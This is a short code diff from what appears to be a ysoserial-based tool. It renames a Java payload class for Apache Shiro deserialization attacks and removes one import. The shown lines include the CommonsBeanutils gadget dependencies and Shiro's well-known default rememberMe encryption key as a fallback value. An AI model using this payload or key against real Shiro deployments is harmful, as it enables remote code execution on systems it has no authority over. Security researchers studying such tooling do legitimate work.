@@ -4,7 +4,6 @@ import org.apache.commons.beanutils.BeanComparator;
 import ysoserial.features.GenerateShiro;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.external.*;
-import ysoserial.payloads.util.Gadgets1;
 import ysoserial.payloads.util.Gadgets2;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
@@ -28,7 +27,7 @@ import java.util.PriorityQueue;
  */
 
 @Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
-public class shiro_CommonsBeanutils1 implements ObjectPayload<String> {
+public class shiro implements ObjectPayload<String> {
     public String getObject(HashMap<String, String> vars) throws Exception {
         String platform = vars.get("platform");
         String vector = vars.get("vector").length() != 0 ? vars.get("vector") : "kPH+bIxk5D2deZiIxcaaaA==";
@@ -61,7 +60,7 @@ public class shiro_CommonsBeanutils1 implements ObjectPayload<String> {
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(shiro_CommonsBeanutils1.class, args);
+        PayloadRunner.run(shiro.class, args);
     }
 
 }
